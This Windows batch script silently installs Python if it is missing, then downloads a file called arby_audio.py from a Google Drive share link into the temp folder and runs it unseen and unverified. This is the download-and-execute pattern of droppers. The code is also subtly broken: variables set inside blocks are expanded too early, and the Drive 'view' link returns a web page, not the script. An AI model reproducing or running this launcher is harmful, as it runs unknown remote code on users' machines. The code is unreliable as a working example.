@echo off
setlocal

:: ------------------------------
:: Check for Python
:: ------------------------------
where python >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo Python not found. Downloading latest Python...
    :: Download Python installer (latest stable 3.x)
    set PYTHON_INSTALLER=%TEMP%\python-installer.exe
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe' -OutFile '%PYTHON_INSTALLER%'"
    echo Installing Python silently...
    "%PYTHON_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
    if %ERRORLEVEL% NEQ 0 (
        echo Python installation failed.
        pause
        exit /b 1
    )
)

:: Ensure Python is available
set PYTHON_BIN=python
%PYTHON_BIN% --version >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    set PYTHON_BIN=python3
)

:: ------------------------------
:: Download Python script
:: ------------------------------
set PY_SCRIPT=%TEMP%\arby_audio.py
powershell -Command "Invoke-WebRequest -Uri 'https://drive.google.com/file/d/1b8NnDwAUOh1Oyf3wPedgk6vMt_Iv-t44/view?usp=sharing' -OutFile '%PY_SCRIPT%'"

:: ------------------------------
:: Execute Python script
:: ------------------------------
%PYTHON_BIN% "%PY_SCRIPT%"
endlocal
pause
